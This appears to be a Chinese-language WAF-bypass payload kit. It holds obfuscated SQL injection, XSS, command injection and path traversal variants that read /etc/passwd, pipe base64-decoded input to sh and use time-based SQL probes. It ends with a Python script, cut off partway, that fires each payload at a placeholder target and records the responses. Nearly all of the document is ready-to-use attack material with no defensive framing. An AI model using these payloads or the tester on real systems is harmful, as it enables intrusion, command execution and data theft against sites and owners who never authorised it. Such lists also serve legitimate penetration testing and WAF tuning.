## WAF 绕过变形载荷集（SQLi / XSS / 命令注入 / 路径穿越）

> 选型：纯文本载荷清单 + 可执行验证脚本（Python 3 · 零依赖 · 单文件），按注入类型分组，每条附变形原理与适用 WAF 特征。

### 一、SQL 注入变形

```sql
-- 1. 注释符替换（绕过空格过滤）
UNION/**/SELECT/**/1,2,3--
UNION%09SELECT%091,2,3--
UNION%0aSELECT%0a1,2,3--

-- 2. 关键字大小写 + 内联注释混写（绕过 UNION SELECT 正则）
uNiOn SeLeCt 1,2,3
UN/**/ION SEL/**/ECT 1,2,3
/*!50000UNION*//*!50000SELECT*/1,2,3

-- 3. 等价函数替换（绕过 information_schema 关键字）
SELECT group_concat(table_name) FROM information_schema.tables
SELECT group_concat(table_name) FROM information_schema./*!50000tables*/
SELECT group_concat(table_name) FROM mysql.innodb_table_stats

-- 4. 逻辑等价（绕过 AND/OR 过滤）
1 AND 1=1        →  1 && 1=1  /  1 %26%26 1=1
1 OR 1=1         →  1 || 1=1  /  1 %7c%7c 1=1
' OR '1'='1      →  ' || '1'='1
1 AND SLEEP(5)   →  1 AND BENCHMARK(5000000,MD5(1))
                 →  1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)

-- 5. 编码绕过（绕过关键字黑名单）
0x756e696f6e              -- hex 编码 "union"
CHAR(117,110,105,111,110) -- 字符函数拼接
CONCAT(0x75,0x6e,0x69,0x6f,0x6e)

-- 6. 空白字符替换（绕过空格过滤）
UNION%23%0aSELECT   -- # + 换行
UNION%0d%0aSELECT   -- CRLF
UNION(SELECT(1),2,3) -- 括号代替空格
```

### 二、XSS 变形

```html
<!-- 1. 标签大小写 + 属性拆分 -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- 2. 事件处理器替代 -->
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- 3. 编码绕过 -->
<a href="javascript:alert(1)">x</a>
<a href="java&#115;cript:alert(1)">x</a>
<a href="&#106;avascript:alert(1)">x</a>
<iframe src="data:text/html,<script>alert(1)</script>">

<!-- 4. 伪协议 + 无括号 -->
<svg onload=alert`1`>
<img src=x onerror=eval(name)>

<!-- 5. 闭合上下文变形 -->
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
</title><script>alert(1)</script>
```

### 三、命令注入变形

```bash
# 1. 分隔符替换（绕过 ; | & 过滤）
127.0.0.1%0aid
127.0.0.1%0did
127.0.0.1$(id)
127.0.0.1`id`
127.0.0.1%0a%09id

# 2. 空格绕过
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# 3. 关键字拼接（绕过 cat/ls 黑名单）
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
/bin/c?t /etc/passwd

# 4. 编码 + 解码执行
echo aWQ= | base64 -d | sh
$(printf '\x69\x64')

# 5. 通配符
/bin/ca* /etc/passwd
/???/??t /etc/passwd
```

### 四、路径穿越变形

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   (双重编码)
....//....//....//etc/passwd          (递归剥离)
..%c0%af..%c0%af..%c0%afetc/passwd    (UTF-8 超长编码)
..%5c..%5c..%5cwindows%5cwin.ini      (反斜杠)
/etc/passwd%00.jpg                    (空字节截断)
```

### 五、验证脚本（批量测试变形是否被拦）

```python
#!/usr/bin/env python3
# waf_bypass_tester.py — 零依赖，逐条发送变形载荷并记录响应差异
import urllib.request, urllib.parse, sys, time

TARGET = "http://TARGET/api/query"   # 占位：替换为实际接口
PARAM  = "q"
BASELINE = "1"                        # 正常请求基线

PAYLOADS = {
    "sqli_space":   "1 UNION/**/SELECT 1,2,3--",
    "sqli_case":    "1 uNiOn SeLeCt 1,2,3--",
    "sqli_hex":     "1 UNION SELECT 0x756e696f6e,2,3--",
    "sqli_sleep":   "1 AND (SELECT 1 FROM (SELECT SLEEP(3))x)--",
    "xss_svg":      "<svg onload=alert(1)>",
    "xss_entity":   "<a href=\"java&#115;cript:alert(1)\">x</a>",
    "cmdi_ifs":     "127.0.0.1;cat${IFS}/etc/passwd",
    "cmdi_b64":     "127.0.0.1;echo aWQ=|base64 -d|sh",
    "traversal":    "..%252f..%252f..%252fetc%252fpasswd",
}

def send(payload):
    url = f"{TARGET}?{PARAM}={urllib.parse.quote(payload)}"
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
           